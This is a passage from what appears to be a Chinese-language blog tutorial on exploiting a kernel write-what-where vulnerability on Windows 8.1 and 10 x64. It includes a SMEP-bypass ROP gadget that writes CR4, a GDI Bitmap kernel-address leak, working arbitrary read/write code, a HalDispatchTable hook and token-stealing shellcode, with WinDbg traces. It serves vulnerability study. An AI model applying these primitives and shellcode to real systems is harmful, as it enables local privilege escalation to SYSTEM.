<p>也就是说我们只需要将cr4修改为0x406f8即可在内核运行我们的shellcode从而提权，那么如何选择我们的ROP呢，我们来观察以下代码片段，可以看到里可以通过rax来修改cr4，那么问题就简单了，我们只需要把rax设为0x406f8不就行了吗，ROPgadgets的计算我们可以通过偏移来查找，首先我们通过前面的知识计算出内核基地址，然后在windbg中用u命令查看<code>KiConfigureDynamicProcessor+0x40</code>的地址，我们用该地址减去基地址即可得到偏移，有了偏移我们加上基地址就可以得到我们ROPgadgets的位置了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; u KiConfigureDynamicProcessor+0x40</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x40:</span><br><span class="line">fffff803`20ffe7cc 0f22e0          mov     cr4,rax</span><br><span class="line">fffff803`20ffe7cf 4883c428        add     rsp,28h</span><br><span class="line">fffff803`20ffe7d3 c3              ret</span><br></pre></td></tr></table></figure>
<p>让我们再次看看我们在win7利用中如何进行Hook的，我们是直接把<code>Hal_hook_address</code>替换为ShellCode的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Trigger_shellcode(Hal_hook_address,(UINT64)&amp;ShellCode);</span><br><span class="line">NtQueryIntervalProfile(<span class="number">0x1234</span>, &amp;interVal);</span><br></pre></td></tr></table></figure>
<p>我们想要做的是把<code>Hal_hook_address</code>先替换为我们的ROP，修改了cr4寄存器之后再执行我们的shellcode，这就需要进行多次读写的操作，显然光靠一个<code>Trigger_shellcode</code>是不够的，这里隆重介绍我们的 BITMAP 对象，这个对象在Windows 8.1中可谓是一个必杀技，用好它可以实现任意读和任意写</p>
<h2 id="BITMAP对象"><a href="#BITMAP对象" class="headerlink" title="BITMAP对象"></a>BITMAP对象</h2><p>首先我们需要了解一下这个对象的大致信息，我们直接用<code>CreateBitmap</code>函数创建一个对象然后下断点进行观察，函数原型如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HBITMAP CreateBitmap(</span><br><span class="line"> _In_ int nWidth,</span><br><span class="line"> _In_ int nHeight,</span><br><span class="line"> _In_ UINT cPlanes,</span><br><span class="line"> _In_ UINT cBitsPerPel,</span><br><span class="line"> _In_ const VOID *lpvBits</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>我们构造如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HBITMAP hBitmap = CreateBitmap(<span class="number">0x10</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	__debugbreak();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们需要用<code>GdiSharedHadnleTable</code>这个句柄表来泄露我们<code>hBitmap</code>的地址，先不用管原理是什么，总之我们现在先找到我们Bitmap的位置，可以看到我们通过一系列操作居然找到了我们的Bitmap，其分配在会话池，大小是0x370</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; r</span><br><span class="line">rax=000000007d050040 rbx=00000043e8613860 rcx=00007ffea6a934fa</span><br><span class="line">rdx=0000000000000000 rsi=0000000000000000 rdi=00000043e8617d50</span><br><span class="line">rip=00007ff7468c1033 rsp=00000043e858f8c0 rbp=0000000000000000</span><br><span class="line"> r8=00000043e858f8b8  r9=0000000000000000 r10=0000000000000000</span><br><span class="line">r11=0000000000000246 r12=0000000000000000 r13=0000000000000000</span><br><span class="line">r14=0000000000000000 r15=0000000000000000</span><br><span class="line">iopl=0         nv up ei pl zr na po nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">WWW!main+0x23:</span><br><span class="line">0033:00007ff7`468c1033 cc              int     3</span><br><span class="line">1: kd&gt; dt ntdll!_PEB -b GdiSharedHandleTable @$Peb</span><br><span class="line">   +0x0f8 GdiSharedHandleTable : 0x00000043`e8920000 </span><br><span class="line">1: kd&gt; ? rax&amp;ffff</span><br><span class="line">Evaluate expression: 64 = 00000000`00000040</span><br><span class="line">1: kd&gt; ? 0x00000043`e8920000+40*18</span><br><span class="line">Evaluate expression: 291664692736 = 00000043`e8920600</span><br><span class="line">1: kd&gt; dq 00000043`e8920600</span><br><span class="line">00000043`e8920600  fffff901`43c3dca0 40057d05`000008f4</span><br><span class="line">00000043`e8920610  00000000`00000000 fffff901`400c2ca0</span><br><span class="line">00000043`e8920620  40050405`00000000 00000000`00000000</span><br><span class="line">00000043`e8920630  fffff901`43c5ed60 40080508`00000000</span><br><span class="line">00000043`e8920640  00000000`00000000 fffff901`43d0d000</span><br><span class="line">00000043`e8920650  40050505`00000000 00000000`00000000</span><br><span class="line">00000043`e8920660  fffff901`43d0b000 40050305`00000000</span><br><span class="line">00000043`e8920670  00000000`00000000 fffff901`43cb9d40</span><br><span class="line">1: kd&gt; !pool fffff901`43c3dca0</span><br><span class="line">unable to get nt!ExpHeapBackedPoolEnabledState</span><br><span class="line">Pool page fffff90143c3dca0 region is Paged session pool</span><br><span class="line"> fffff90143c3d000 size:  9f0 previous size:    0  (Allocated)  Gla1</span><br><span class="line"> fffff90143c3d9f0 size:   90 previous size:  9f0  (Allocated)  DCba Process: ffffe00002475080</span><br><span class="line"> fffff90143c3da80 size:   50 previous size:   90  (Free)       Free</span><br><span class="line"> fffff90143c3dad0 size:   a0 previous size:   50  (Allocated)  Usqm</span><br><span class="line"> fffff90143c3db70 size:   30 previous size:   a0  (Allocated)  Uspi Process: ffffe00002b83900</span><br><span class="line"> fffff90143c3dba0 size:   f0 previous size:   30  (Allocated)  Gla8</span><br><span class="line">*fffff90143c3dc90 size:  370 previous size:   f0  (Allocated) *Gla5</span><br><span class="line">		Pooltag Gla5 : GDITAG_HMGR_LOOKASIDE_SURF_TYPE, Binary : win32k.sys</span><br></pre></td></tr></table></figure>
<p>让我们理一下这个过程，首先从命令中我们知道<code>GdiSharedHandleTable</code>是在PEB中，而<code>GdiSharedHandleTable</code>本身是一个保存GDI对象的句柄表，其指向的是一个叫<code>GDICELL64</code>的结构，其大小是0x18：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    PVOID pKernelAddress;</span><br><span class="line">    USHORT wProcessID;</span><br><span class="line">    USHORT wCount;</span><br><span class="line">    USHORT wUpper;</span><br><span class="line">    PVOID wType;</span><br><span class="line">    PVOID64 pUserAddress;</span><br><span class="line">&#125; GDICELL64;</span><br></pre></td></tr></table></figure>
<p>从上面我们可以看到它可以泄露我们内核中的地址，过程就是先计算出函数返回值(rax)的低4字节作为索引，然后乘上<code>GDICELL64</code>的大小0x18，再加上<code>GdiSharedHandleTable</code>的地址即可得到我们Bitmap的地址，换成代码实现就是</p>
<ul>
<li>首先找到我们的TEB</li>
<li>通过TEB找到PEB</li>
<li>再通过PEB找到<code>GdiSharedHandleTable</code>句柄表</li>
<li>通过计算获得Bitmap的地址</li>
</ul>
<p>关键实现代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">getGdiShreadHandleTableAddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 tebAddr = (DWORD64)NtCurrentTeb();</span><br><span class="line">	DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + <span class="number">0x60</span>);</span><br><span class="line">	DWORD64 GdiShreadHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + <span class="number">0xf8</span>);</span><br><span class="line">	<span class="keyword">return</span> GdiShreadHandleTableAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">getBitMapAddr</span><span class="params">(HBITMAP hBitmap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD arrayIndex = LOWORD(hBitmap);</span><br><span class="line">	<span class="keyword">return</span> *(PDWORD64)(getGdiShreadHandleTableAddr() + arrayIndex * <span class="number">0x18</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>让我们来查看一下Bitmap的结构，我们只需要关注重点的位置就行了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"> BASEOBJECT64 BaseObject; <span class="comment">// 0x18bytes</span></span><br><span class="line"> SURFOBJ64 SurfObj; </span><br><span class="line"> ....... </span><br><span class="line">&#125; SURFACE64</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"> ULONG64 hHmgr; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG32 ulShareCount; <span class="comment">// 4bytes</span></span><br><span class="line"> WORD cExclusiveLock; <span class="comment">// 2bytes</span></span><br><span class="line"> WORD BaseFlags; <span class="comment">// 2bytes</span></span><br><span class="line"> ULONG64 Tid; <span class="comment">// 8bytes</span></span><br><span class="line">&#125; BASEOBJECT64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"> ULONG64 dhsurf; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 hsurf; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 dhpdev; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 hdev; <span class="comment">// 8bytes</span></span><br><span class="line"> SIZEL sizlBitmap; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 cjBits; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 pvBits; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 pvScan0; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG32 lDelta; <span class="comment">// 4bytes</span></span><br><span class="line"> ULONG32 iUniq; <span class="comment">// 4bytes</span></span><br><span class="line"> ULONG32 iBitmapFormat; <span class="comment">// 4bytes</span></span><br><span class="line"> USHORT iType; <span class="comment">// 2bytes</span></span><br><span class="line"> USHORT fjBitmap; <span class="comment">// 2bytes</span></span><br><span class="line">&#125; SURFOBJ64</span><br></pre></td></tr></table></figure>
<p>这里我借鉴图片来说明，我们关注的点就只有一个<code>pvScan0</code>结构，它的偏移是 +0x50 处，可以发现它指向我们的<code>Pixel Data</code>，这个结构就是我们<code>CreateBitmap</code>函数传入的第五个参数，也就是说我们传入aaaa，那么pVscan0指向地址的内容就是aaaa</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/6.png" alt="6"></p>
<h2 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h2><p>我们刚才分析了那么多，说到底都是为了一个目的 =&gt; 任意读任意写，那么如何才能任意读和写呢？这里我再介绍两个比较重要的函数<code>SetBitmapBits</code>和<code>GetBitmapBits</code>其原型如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">SetBitmapBits</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HBITMAP    hbm,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      cb,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> VOID *pvBits</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONG <span class="title">GetBitmapBits</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HBITMAP hbit,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG    cb,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpvBits</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这两个函数的作用是向pvScan0指向的地址写(读)cb byte大小的数据，说到这里貌似有一点任意读写的感觉了，光靠一个pvScan0是肯定不能任意读写的，所以这里我们考虑使用两个pvScan0，我们把一个pvScan0指向另外一个pvScan0，我们有<code>TriggerArbitraryOverwrite</code>函数可以实现将一个pvScan0指向另一个pvScan0，然后我们再调用<code>SetBitmapBits</code>和<code>GetBitmapBits</code>函数岂不是就可以进行任意读写了，我们用图片说明：</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/7.png" alt="7"></p>
<p>我们任意读写的代码构造如下，read函数实现将whereRead的内容读到whatValue的位置，write函数实现将whatValue的内容写入whereWrite的位置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">readOOB</span><span class="params">(DWORD64 whereRead, LPVOID whatValue, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SetBitmapBits(hManagerBitmap, len, &amp;whereRead);</span><br><span class="line">	GetBitmapBits(hWorkerBitmap, len, whatValue);	<span class="comment">// read</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">writeOOB</span><span class="params">(DWORD64 whereWrite, LPVOID whatValue, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SetBitmapBits(hManagerBitmap, len, &amp;whereWrite);</span><br><span class="line">	SetBitmapBits(hWorkerBitmap, len, &amp;whatValue);	<span class="comment">// write</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>让我们平复一下激动的心情，我们现在有了任意读和写的机会了，我们只需要将我们的ROPgadgets写入我们需要Hook的位置，然后调用问题函数执行shellcode就行了，这里我们需要注意的是，我们还需要调整调整堆栈的一些信息，不然很容易就蓝屏了，这里我们进行三次读写操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readOOB(Hal_hook_address, &amp;lpRealHooAddress, <span class="keyword">sizeof</span>(LPVOID));  			<span class="comment">// 保存Hook地址</span></span><br><span class="line">writeOOB(Hal_hook_address, (LPVOID)ROPgadgets, <span class="keyword">sizeof</span>(DWORD64));		<span class="comment">// 写入ROPgadgets</span></span><br><span class="line"><span class="comment">//调用问题函数</span></span><br><span class="line">writeOOB(Hal_hook_address, (LPVOID)lpRealHooAddress, <span class="keyword">sizeof</span>(DWORD64));	 <span class="comment">// 还原Hook地址,不然会蓝屏</span></span><br></pre></td></tr></table></figure>
<h2 id="整合思路"><a href="#整合思路" class="headerlink" title="整合思路"></a>整合思路</h2><p>我们最后整合一下思路</p>
<ul>
<li>初始化句柄等结构</li>
<li>内核中构造放置我们的shellcode</li>
<li>申请两个Bitmap并泄露Bitmap中的pvScan0</li>
<li>调用<code>TriggerArbitraryOverwrite</code>函数将一个pvScan0指向另一个pvScan0</li>
<li>两次读写实现写入ROPgadgets</li>
<li>调用<code>NtQueryIntervalProfile</code>问题函数</li>
<li>一次写入操作实现还原Hook地址的内容</li>
</ul>
<p>最后整合一下代码即可实现利用，整体代码和验证结果参考 =&gt; <a href="https://github.com/ThunderJie/Write-What-Where" target="_blank" rel="noopener">这里</a></p>
<h1 id="0x03：Windows-8-1-x64的一个坑"><a href="#0x03：Windows-8-1-x64的一个坑" class="headerlink" title="0x03：Windows 8.1 x64的一个坑"></a>0x03：Windows 8.1 x64的一个坑</h1><p>首先我们回顾一下我们在上面的利用中可能存在的一个坑</p>
<p><strong>Shellcode的构造</strong></p>
<p>上篇我只是简单提了一下内核中构造放置我们的shellcode，如果你看了我的源码，里面的构造函数如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ConstrutShellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to construt Shellcode\n"</span>);</span><br><span class="line">	VOID* shellAddr = (<span class="keyword">void</span>*)<span class="number">0x100000</span>;</span><br><span class="line">	shellAddr = VirtualAlloc(shellAddr, <span class="number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memset</span>(shellAddr, <span class="number">0x41</span>, <span class="number">0x1000</span>);</span><br><span class="line">	CopyMemory((VOID*)<span class="number">0x100300</span>, ShellCode, <span class="number">0x200</span>);</span><br><span class="line">	<span class="comment">//__debugbreak();</span></span><br><span class="line">	UINT64* recoverAddr = (UINT64*)((PBYTE)(<span class="number">0x100300</span>) + <span class="number">0x44</span>);</span><br><span class="line">	*(recoverAddr) = (DWORD64)ntoskrnlbase() + <span class="number">0x4c8f75</span>; <span class="comment">// nt!KeQueryIntervalProfile+0x25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你可能会疑惑<code>recoverAddr</code>这个东西是拿来做什么用的，先不要着急我们在看看我们shellcode的实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.code</span><br><span class="line">ShellCode proc</span><br><span class="line">	; shellcode编写</span><br><span class="line">	mov rax, gs:[188h]</span><br><span class="line">	mov rax, [rax+220h]</span><br><span class="line">	mov	rcx, rax</span><br><span class="line">	mov	rdx, 4</span><br><span class="line"></span><br><span class="line">findSystemPid:</span><br><span class="line">	mov	rax, [rax+2e8h]</span><br><span class="line">	sub	rax, 2e8h</span><br><span class="line">	cmp	[rax+2e0h], rdx</span><br><span class="line">	jnz findSystemPid</span><br><span class="line"></span><br><span class="line">	mov rdx, [rax+348h]</span><br><span class="line">	mov [rcx+348h], rdx</span><br><span class="line">	sub rsp,30h						;堆栈平衡</span><br><span class="line">	mov rax, 0aaaaaaaaaaaaaaaah		 ;这个位置放进入Gadgets返回后的后半部分函数</span><br><span class="line">	mov [rsp], rax</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">ShellCode endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>从上面可以看到，我在最后的地方用了几句汇编将堆栈平衡了，这其实是我调试了很久才得到的结果，我简单提一下这个过程，首先我们知道我们把shellcode放置在了0x100300的位置，我们还知道我们需要执行我们的ROP，所以我们需要在windbg中下两个硬件断点观察，注意shellcode中不能用int 3下软件断点，这样会修改堆栈的平衡导致一些问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; u nt!KiConfigureDynamicProcessor+0x40</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x40:</span><br><span class="line">fffff803`20ffe7cc 0f22e0          mov     cr4,rax</span><br><span class="line">fffff803`20ffe7cf 4883c428        add     rsp,28h</span><br><span class="line">fffff803`20ffe7d3 c3              ret</span><br><span class="line">...</span><br><span class="line">1: kd&gt; ba e1 fffff803`20ffe7cc</span><br><span class="line">1: kd&gt; u 100300</span><br><span class="line">00000000`00100300 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">00000000`00100309 488b8020020000  mov     rax,qword ptr [rax+220h]</span><br><span class="line">00000000`00100310 488bc8          mov     rcx,rax</span><br><span class="line">...</span><br><span class="line">1: kd&gt; ba e1 00000000`00100300</span><br></pre></td></tr></table></figure>
<p>我们g运行到第一个断点，t单步到ret处，查看堆栈结构和我们现在rc4寄存器的值，可以发现我们的寄存器已经被修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x40:</span><br><span class="line">fffff803`20ffe7cc 0f22e0          mov     cr4,rax</span><br><span class="line">1: kd&gt; t</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x43:</span><br><span class="line">fffff803`20ffe7cf 4883c428        add     rsp,28h</span><br><span class="line">1: kd&gt; t</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x47:</span><br><span class="line">fffff803`20ffe7d3 c3              ret</span><br><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffffd000`27acf9a0  00000000`00100300</span><br><span class="line">ffffd000`27acf9a8  00000000`00000000</span><br><span class="line">ffffd000`27acf9b0  00000000`00000000</span><br><span class="line">ffffd000`27acf9b8  00000000`00000000</span><br><span class="line">ffffd000`27acf9c0  00000000`00000000</span><br><span class="line">ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e</span><br><span class="line">ffffd000`27acf9d0  00000000`00000000</span><br><span class="line">ffffd000`27acf9d8  00000000`00000000</span><br><span class="line">ffffd000`27acf9e0  00000000`00000000</span><br><span class="line">ffffd000`27acf9e8  00000000`00000000</span><br><span class="line">ffffd000`27acf9f0  00000000`00000000</span><br><span class="line">ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13</span><br><span class="line">ffffd000`27acfa00  ffffe000`01b9a4c0</span><br><span class="line">ffffd000`27acfa08  00007ffe`00000008</span><br><span class="line">ffffd000`27acfa10  ffffffff`fff85ee0</span><br><span class="line">ffffd000`27acfa18  ffffd000`00000008</span><br><span class="line">1: kd&gt; r cr4</span><br><span class="line">cr4=00000000000406f8</span><br></pre></td></tr></table></figure>
<p>我们t单步再次观察堆栈，这里已经开始执行我们的shellcode了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; t</span><br><span class="line">00000000`00100300 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffffd000`27acf9a8  00000000`00000000</span><br><span class="line">ffffd000`27acf9b0  00000000`00000000</span><br><span class="line">ffffd000`27acf9b8  00000000`00000000</span><br><span class="line">ffffd000`27acf9c0  00000000`00000000</span><br><span class="line">ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e</span><br><span class="line">ffffd000`27acf9d0  00000000`00000000</span><br><span class="line">ffffd000`27acf9d8  00000000`00000000</span><br><span class="line">ffffd000`27acf9e0  00000000`00000000</span><br><span class="line">ffffd000`27acf9e8  00000000`00000000</span><br><span class="line">ffffd000`27acf9f0  00000000`00000000</span><br><span class="line">ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13</span><br><span class="line">ffffd000`27acfa00  ffffe000`01b9a4c0</span><br><span class="line">ffffd000`27acfa08  00007ffe`00000008</span><br><span class="line">ffffd000`27acfa10  ffffffff`fff85ee0</span><br><span class="line">ffffd000`27acfa18  ffffd000`00000008</span><br><span class="line">ffffd000`27acfa20  000000bf`00000000</span><br></pre></td></tr></table></figure>
<p>我们继续单步运行到shellcode中<code>sub rsp,30h</code>的位置，查看堆栈之后继续单步，我们可以看到rsp中内容被修改为了0x010033e，而0x010033e中存放的内容正是我们<code>nt!KeQueryIntervalProfile+0x25</code>中的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; t</span><br><span class="line">00000000`0010033e 4883ec30        sub     rsp,30h</span><br><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffffd000`27acf9a8  00000000`00000000</span><br><span class="line">ffffd000`27acf9b0  00000000`00000000</span><br><span class="line">ffffd000`27acf9b8  00000000`00000000</span><br><span class="line">ffffd000`27acf9c0  00000000`00000000</span><br><span class="line">ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e</span><br><span class="line">ffffd000`27acf9d0  00000000`00000000</span><br><span class="line">ffffd000`27acf9d8  00000000`00000000</span><br><span class="line">ffffd000`27acf9e0  00000000`00000000</span><br><span class="line">ffffd000`27acf9e8  00000000`00000000</span><br><span class="line">ffffd000`27acf9f0  00000000`00000000</span><br><span class="line">ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13</span><br><span class="line">ffffd000`27acfa00  ffffe000`01b9a4c0</span><br><span class="line">ffffd000`27acfa08  00007ffe`00000008</span><br><span class="line">ffffd000`27acfa10  ffffffff`fff85ee0</span><br><span class="line">ffffd000`27acfa18  ffffd000`00000008</span><br><span class="line">ffffd000`27acfa20  000000bf`00000000</span><br><span class="line">1: kd&gt; t</span><br><span class="line">00000000`00100342 48b875ff142103f8ffff mov rax,offset nt!KeQueryIntervalProfile+0x25 (fffff803`2114ff75)</span><br><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffffd000`27acf978  00000000`0010033e</span><br><span class="line">ffffd000`27acf980  00000000`00000010</span><br><span class="line">ffffd000`27acf988  00000000`00000344</span><br><span class="line">ffffd000`27acf990  ffffd000`27acf9a8</span><br><span class="line">ffffd000`27acf998  00000000`00000018</span><br><span class="line">ffffd000`27acf9a0  00000000`00100300</span><br><span class="line">ffffd000`27acf9a8  00000000`00000000</span><br><span class="line">ffffd000`27acf9b0  00000000`00000000</span><br><span class="line">ffffd000`27acf9b8  00000000`00000000</span><br><span class="line">ffffd000`27acf9c0  00000000`00000000</span><br><span class="line">ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e</span><br><span class="line">ffffd000`27acf9d0  00000000`00000000</span><br><span class="line">ffffd000`27acf9d8  00000000`00000000</span><br><span class="line">ffffd000`27acf9e0  00000000`00000000</span><br><span class="line">ffffd000`27acf9e8  00000000`00000000</span><br><span class="line">ffffd000`27acf9f0  00000000`00000000</span><br><span class="line">1: kd&gt; u 00000000`0010033e</span><br><span class="line">00000000`0010033e 4883ec30        sub     rsp,30h</span><br><span class="line">00000000`00100342 48b875ff142103f8ffff mov rax,offset nt!KeQueryIntervalProfile+0x25 (fffff803`2114ff75)</span><br><span class="line">00000000`0010034c 48890424        mov     qword ptr [rsp],rax</span><br><span class="line">00000000`00100350 c3              ret</span><br><span class="line">00000000`00100351 cc              int     3</span><br><span class="line">00000000`00100352 cc              int     3</span><br><span class="line">00000000`00100353 cc              int     3</span><br><span class="line">00000000`00100354 cc              int     3</span><br></pre></td></tr></table></figure>
<p><code>nt!KeQueryIntervalProfile+0x25</code>是哪里呢，这个值刚好是我们Hook位置的下一句汇编，我们将其放回原位即可做到原封不动的还原内核函数，这样就可以完美的提权而不蓝屏</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; u nt!KeQueryIntervalProfile</span><br><span class="line">nt!KeQueryIntervalProfile:</span><br><span class="line">fffff803`2114ff50 4883ec48        sub     rsp,48h</span><br><span class="line">fffff803`2114ff54 83f901          cmp     ecx,1</span><br><span class="line">fffff803`2114ff57 7430            je      nt!KeQueryIntervalProfile+0x39 (fffff803`2114ff89)</span><br><span class="line">fffff803`2114ff59 ba18000000      mov     edx,18h</span><br><span class="line">fffff803`2114ff5e 894c2420        mov     dword ptr [rsp+20h],ecx</span><br><span class="line">fffff803`2114ff62 4c8d4c2450      lea     r9,[rsp+50h]</span><br><span class="line">fffff803`2114ff67 8d4ae9          lea     ecx,[rdx-17h]</span><br><span class="line">fffff803`2114ff6a 4c8d442420      lea     r8,[rsp+20h]</span><br><span class="line">0: kd&gt; u</span><br><span class="line">nt!KeQueryIntervalProfile+0x1f:</span><br><span class="line">fffff803`2114ff6f ff15f377ddff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff803`20f27768)]</span><br><span class="line">fffff803`2114ff75 85c0            test    eax,eax // nt!KeQueryIntervalProfile+0x25</span><br><span class="line">fffff803`2114ff77 7818            js      nt!KeQueryIntervalProfile+0x41 (fffff803`2114ff91)</span><br><span class="line">fffff803`2114ff79 807c242400      cmp     byte ptr [rsp+24h],0</span><br><span class="line">fffff803`2114ff7e 7411            je      nt!KeQueryIntervalProfile+0x41 (fffff803`2114ff91)</span><br><span class="line">fffff803`2114ff80 8b442428        mov     eax,dword ptr [rsp+28h]</span><br><span class="line">fffff803`2114ff84 4883c448        add     rsp,48h</span><br><span class="line">fffff803`2114ff88 c3              ret</span><br></pre></td></tr></table></figure>
<h1 id="0x02：Windows-10-1511-1607-x64下的利用"><a href="#0x02：Windows-10-1511-1607-x64下的利用" class="headerlink" title="0x02：Windows 10 1511-1607 x64下的利用"></a>0x02：Windows 10 1511-1607 x64下的利用</h1><p>好了我们整理完了win 8.1下的一些坑我们开始我们在win10中的利用，win8.1中最浪费时间的操作便是堆栈的平衡问题，那我们可不可以有更简单的方法提权呢？当然有的，我们都有任意读写的权限了不是吗，既然有任意读写的权限，那么我们完全可以用任意读写的操作实现对token的替换，我们甚至不用我们的shellcode都可以提权，这种做法非常的简便，并不需要考虑shellcode在内核中运行遇到的堆栈平衡问题，我们的关键点始终还是在泄露pvScan0的地方，我们在win 10 1607和win 10 1511中观察一下我们创建的Bitmap结构，和win 8.1进行比较，构造如下代码片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HBITMAP hBitmap = CreateBitmap(<span class="number">0x10</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	__debugbreak();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Win 8.1 x64</strong></p>
